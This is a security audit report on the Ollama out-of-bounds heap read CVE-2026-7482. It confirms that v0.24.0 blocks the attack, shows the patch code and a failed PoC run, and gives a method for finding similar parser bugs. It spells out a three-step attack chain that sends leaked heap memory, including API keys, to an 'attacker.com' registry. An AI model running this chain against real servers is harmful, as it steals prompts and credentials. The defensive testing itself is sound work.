# Bleeding Llama (CVE-2026-7482) — v0.24.0 Test Results

**Date:** May 2026
**Target:** Ollama v0.24.0 (bundles llama.cpp ec98e2002)
**Result: PATCHED — not vulnerable**

---

## What Is Bleeding Llama?

CVE-2026-7482 (CVSS 9.1) — unauthenticated remote memory disclosure in Ollama. Attacker uploads a crafted GGUF with a tensor shape claiming more elements than the actual data contains. During F16→F32 quantization, the C++ conversion function (`ggml_fp16_to_fp32_row`) reads past the buffer into heap memory. The poisoned model is then exfiltrated via `/api/push` with an attacker-controlled registry URL.

**Attack chain (3 API calls):**
1. `POST /api/blobs/sha256:<hash>` — upload crafted GGUF
2. `POST /api/create` with `quantize: "F32"` and model name = `http://attacker.com/ns/model:tag`
3. `POST /api/push` — exfiltrates model file containing heap data

**Leaked data:** user prompts, system prompts, environment variables (AWS keys, API keys).

---

## Why v0.24.0 Is Patched

Two defensive layers block the attack:

### Layer 1: GGUF Parse-Time Validation (`fs/ggml/gguf.go:258-262`)
```go
for _, tensor := range llm.tensors {
    tensorEnd := llm.tensorOffset + tensor.Offset + tensor.Size()
    if tensorEnd > uint64(fileSize) {
        return fmt.Errorf("tensor %q offset+size (%d) exceeds file size (%d)", tensor.Name, tensorEnd, fileSize)
    }
}
```

### Layer 2: Quantization Bounds Check (`server/quantization.go:38`)
```go
if uint64(len(data)) < q.from.Size() {
    return 0, fmt.Errorf("tensor %s data size %d is less than expected %d from shape %v", ...)
}
```

---

## PoC Test Result

```
$ python3 poc_bleeding_llama.py http://127.0.0.1:11434 leak-test
[*] declared elements: 1000000, actual data: 1024 bytes
[+] blob uploaded OK
[-] create failed: 500 {"error":"tensor \"test.weight\" offset+size (2000160) exceeds file size (1184)"}
```

Blocked at Layer 1.

---

## Related Audit Findings (This Session)

| Area | Finding | Status |
|------|---------|--------|
| Bleeding Llama | Heap read via quantization | Patched in v0.24.0 |
| Request Smuggling | Go net/http single parser | Not viable (strict parser, no proxy chain) |
| BashTool RCE | exec.CommandContext(bash) in x/tools/bash.go | Not reachable from HTTP API (local-only agent) |
| Web Search SSRF | Hardcoded ollama.com APIs | No arbitrary URL fetching |
| Template Injection | 4 custom functions, no I/O/exec | Sandbox escape not viable |
| Update RCE | Code signature verification | Authenticode + code signing required |
| Vision/Image | Pure Go image decode to tensor | Memory-safe, no subprocess |
| Embedding | Same tensor math as text gen | No additional attack surface |

---

## Technique: Testing Model Parsers for OOB Reads

1. Find shape-to-size computation: `ne[0] * ne[1] * type_size / block_size`
2. Check file-size validation: does parser verify `offset + size <= file_size`?
3. Check conversion functions: does quantizer read exactly `elements` items?
4. Test: shape claims N elements but file has < N*type_size bytes
5. Check defense-in-depth: bounds check at BOTH parse time AND conversion time
6. For Go: search for `unsafe.Slice` and `unsafe.Pointer` — these bypass Go memory safety
